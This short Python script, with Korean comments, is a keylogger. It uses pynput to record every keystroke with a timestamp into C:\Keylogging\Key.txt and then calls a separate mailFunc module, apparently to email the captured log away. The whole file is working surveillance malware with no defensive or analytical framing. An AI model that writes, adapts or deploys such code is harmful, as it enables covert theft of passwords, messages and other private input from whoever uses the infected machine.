from pynput.keyboard import Key, Listener
import logging
import logging.handlers
import os
import time
import datetime

if os.path.isdir('C:\\Keylogging') == False:
    os.mkdir('C:\\Keylogging')
    f = open("C:\\Keylogging\\Key.txt", 'w')
    f.close()

#이메일 보내는 기능을 기술한 mailFunc.py 소환
import mailFunc

log_dir = ''

logging.basicConfig(filename=(log_dir + "C:\\Keylogging\\Key.txt"),
                    level=logging.DEBUG, format='["%(asctime)s". %(message)s]')


# 키 입력을 받음
def on_press(key):
    logging.info('"{0}"'.format(key))

with Listener(on_press = on_press) as listener:
    listener.join()

mailFunc.autoEmailSend()